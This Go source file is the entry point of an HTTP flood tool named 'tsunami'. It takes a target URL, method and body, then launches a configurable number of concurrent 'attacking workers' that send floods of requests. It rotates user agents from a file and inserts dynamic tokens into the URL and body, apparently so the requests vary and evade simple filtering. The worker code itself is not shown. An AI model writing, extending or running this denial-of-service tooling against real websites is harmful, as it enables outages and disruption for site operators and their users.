package main

import (
	"fmt"
	"gopkg.in/alecthomas/kingpin.v2"
	"log"
	"net/url"
)

//Command line args
var (
	verbose         = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
	maxWorkers      = kingpin.Flag("workers", "Amount of concurrent attacking workers (threads).").Default("8").Short('w').Int()
	maxRequests     = kingpin.Flag("max-requests", "Amount requests to send before exiting.").Default("-1").Short('m').Int()
	maxSeconds      = kingpin.Flag("max-seconds", "Amount of seconds before tsunami force closes.").Default("-1").Short('s').Int()
	displayInterval = kingpin.Flag("interval", "Interval in milliseconds between display of attack stats.").Default("1000").Short('i').Int()
	userAgentFile   = kingpin.Flag("user-agents", "Path of file containing newline(0x0a) seperated user agents.").Default("user-agents.txt").String()
	//headerFile      = kingpin.Flag("headers", "Path of JSON file containing headers (they will overwrite) ").Default("headers.json").String()
	target = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
	method = kingpin.Arg("method", "HTTP method used for flood.").Default("GET").String()
	body   = kingpin.Arg("body", "Body of request, useful for POST/PUT.").Default("").String()
)

var (
	requestCounter    int
	workerCounter     int
	workerDeadCounter int
	exitChan          chan int
	requestChan       chan bool
	workers           map[int]*floodWorker
	tokenizedTarget   tokenizedString
	tokenizedBody     tokenizedString
)

func main() {

	//Parse arguments
	kingpin.Parse()
	u, err := url.Parse(*target)
	if err != nil {
		log.Fatal("URL Invalid")
	}

	if !((u.Scheme == "http") || (u.Scheme == "https")) {
		log.Fatal(fmt.Sprintf("URL scheme (%s) unsupported", u.Scheme))
	}

	//URL and body may contain dynamic tokens
	tokenizedTarget = *NewTokenizedString(*target)
	tokenizedBody = *NewTokenizedString(*body)

	//Reflect arguments
	if *verbose {
		fmt.Printf("URL => %s\n", *target)
		fmt.Printf("Workers => %d\n", *maxWorkers)
	}

	//Instantiate stuff
	exitChan = make(chan int)
	requestChan = make(chan bool)
	workers := map[int]*floodWorker{}

	loadUserAgents()

	//Start flood workers
	for workerCounter < *maxWorkers {
		workers[workerCounter] = &floodWorker{
			exitChan: exitChan,
			id:       workerCounter,
			target:   *u,
		}

		if *verbose {
			fmt.Printf("Thread %d started\n", workerCounter)
		}

		workers[workerCounter].Start()
		workerCounter += 1
	}

	//Misc workers
	go Outputter()
	go MaxRequestEnforcer()
	go MaxSecondsEnforcer()
	WorkerOverseer()
}
